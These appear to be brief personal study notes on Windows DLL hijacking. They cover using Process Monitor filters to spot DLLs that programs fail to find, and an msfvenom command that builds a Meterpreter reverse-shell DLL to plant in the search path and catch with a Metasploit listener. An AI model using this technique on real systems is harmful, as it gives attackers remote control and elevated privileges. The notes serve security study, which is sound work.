## DLL hijacking

## Process Monitor Software
> windows software required
> use Filters to list DLL files

### filter dll files
```
// in filter tab use
Path endwith .dll include
// then apply
```
![c7d432ea1f0893a616db2ce433fba526.png](../../../_resources/c7d432ea1f0893a616db2ce433fba526.png)

### working 
> 1. programs need dll files to run 
> 2. then search dll in theri current directory , system32 , system , c drive etc. , search in specific order 
> 3. we will place malicious dll files for progam who need
> 4. look for progam who search DLL and did not found it , then we place DLL where program search it 

### filter missing dll files
```
// DLL not found , search
// in filter
Result is NAME NOT FOUND include

```
![f9c0727e20e3102f9c4a54acb69a8750.png](../../../_resources/f9c0727e20e3102f9c4a54acb69a8750.png)

## DLL create
### msfvenom
```
msfvenom -p window/meterpreter/reverse_tcp LHOST=<your_ip> -f dll -o <dll_name>
```
#### then use put dll with required name in required path
#### use msf listner


---

### process monitor

```
in filter 
use  , USER filter to see dll of system users
and exploit them
```